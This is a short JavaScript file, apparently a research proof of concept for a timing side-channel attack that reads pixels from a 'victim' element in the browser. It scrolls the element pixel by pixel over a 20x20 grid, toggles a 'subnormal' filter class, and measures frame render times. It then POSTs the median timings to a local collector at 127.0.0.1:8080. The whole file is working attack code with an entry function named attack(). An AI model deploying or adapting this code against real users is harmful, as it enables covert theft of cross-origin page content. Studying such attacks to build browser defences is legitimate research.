var name = "checkerboard";
var col_max = 20;
var row_max = 20;
var index = 0;
var duration = 0.0;
var times = [];
var count_max = 5;

function scroll_to_target_pixel(top, left) {
    var victim = document.getElementById("victim");
    victim.scrollTop = top;
    victim.scrollLeft = left;
}

function oned_to_2d_coord(oned, col_max) {
    row = Math.floor(oned / col_max);
    col = oned % col_max;
    return [row, col];
}

function median(values){
    if(values.length ===0) {
        return 0;
    }
    values.sort(function(a,b){
        return a-b;
    });
    var half = Math.floor(values.length / 2);
    if (values.length % 2) {
        return values[half];
    }
    return (values[half - 1] + values[half]) / 2.0;
}

function send(times) {
    var response = {"name": name, "dim": [row_max, col_max], "duration": duration, "times": times};
    var response_str = JSON.stringify(response);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', "http://127.0.0.1:8080/");
    //xhr.setRequestHeader( "Content-Type", "application/json" );
    xhr.send(response_str);
}

function time_one_pixcel(t_){
    if (index == 0) {
        duration = performance.now();
    }
    if (index >= row_max * col_max) {
        duration = performance.now() - duration;
        send(times);
        return null;
    }
    var element = document.getElementById('inspect');
    var coord = oned_to_2d_coord(index, col_max);
    var row = coord[0];
    var col = coord[1];
    scroll_to_target_pixel(row, col);
    var count = 0;
    var last_time = 0;
    var times_one_pixel = [];
    function add_filter(t){
        last_time = performance.now()
        element.classList.toggle("subnormal");
        requestAnimationFrame(remove_filter);
        return null;
    }
    function remove_filter(t){
        diff = performance.now() - last_time;
        times_one_pixel.push(diff);
        element.classList.toggle("subnormal");
        count++;
        if (count < count_max) {
            requestAnimationFrame(add_filter);
            return null;
        } else {
            var median_value = median(times_one_pixel);
            times.push(median_value);
            index++;
            requestAnimationFrame(time_one_pixcel)
            return null;
        }
    }
    requestAnimationFrame(add_filter);
    return null;
}

function attack() {
    requestAnimationFrame(time_one_pixcel);
}